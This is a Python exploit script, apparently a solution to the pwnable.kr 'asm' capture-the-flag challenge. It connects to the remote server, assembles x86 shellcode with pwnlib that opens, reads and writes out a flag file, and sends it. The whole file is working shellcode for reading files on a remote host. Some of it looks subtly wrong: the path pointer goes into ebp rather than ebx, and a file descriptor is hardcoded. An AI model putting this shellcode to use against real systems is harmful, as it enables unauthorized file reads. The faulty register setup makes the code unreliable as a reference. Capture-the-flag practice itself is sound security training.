import pwnlib
import socket

FLAG_NAME = ".////this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
IP = "pwnable.kr"
PORT = 9026
CHUNK = 4096

def main():
	
	s = socket.socket()
	s.connect ((IP,PORT))
	data = s.recv (CHUNK)
	print (data)
	data = s.recv (CHUNK)
	print (data)


	reverse_flag_name_chunks = list(map(''.join, zip(*[iter(FLAG_NAME)]*4)))[::-1]
	

	# open syscall
	shellcode = ''
	shellcode += pwnlib.asm.asm ("xor eax, eax")
	shellcode += pwnlib.asm.asm ("push eax") # needed for the string null byte
	shellcode += pwnlib.asm.asm ("add eax, 5")

	for chunk in reverse_flag_name_chunks:
		num = "0x" + ''.join(x.encode('hex') for x in chunk[::-1])
		shellcode += pwnlib.asm.asm ("push {}".format(num))

	shellcode += pwnlib.asm.asm ("mov ebp, esp")
	# shellcode += pwnlib.asm.asm ("xor ecx, ecx")
	shellcode += pwnlib.asm.asm ("xor edx, edx")
	shellcode += pwnlib.asm.asm ("int 0x80")


	# read syscall
	shellcode += pwnlib.asm.asm ("xor eax, eax")
	shellcode += pwnlib.asm.asm ("add eax, 3")
	shellcode += pwnlib.asm.asm ("mov ecx, ebx")
	shellcode += pwnlib.asm.asm ("xor ebx, ebx")
	shellcode += pwnlib.asm.asm ("add ebx, 3")
	shellcode += pwnlib.asm.asm ("xor edx, edx")
	shellcode += pwnlib.asm.asm ("mov dl, 0x60")
	shellcode += pwnlib.asm.asm ("int 0x80")


	# write syscall
	shellcode += pwnlib.asm.asm ("xor eax, eax")
	shellcode += pwnlib.asm.asm ("add eax, 4")
	shellcode += pwnlib.asm.asm ("xor ebx, ebx")
	shellcode += pwnlib.asm.asm ("add ebx, 1")
	shellcode += pwnlib.asm.asm ("int 0x80")



	shellcode += '\n'
	print (shellcode)
	s.send (shellcode)
	data = s.recv (CHUNK)
	print (data)
	data = s.recv (CHUNK)
	print (data)
	
if __name__ == '__main__':
	main()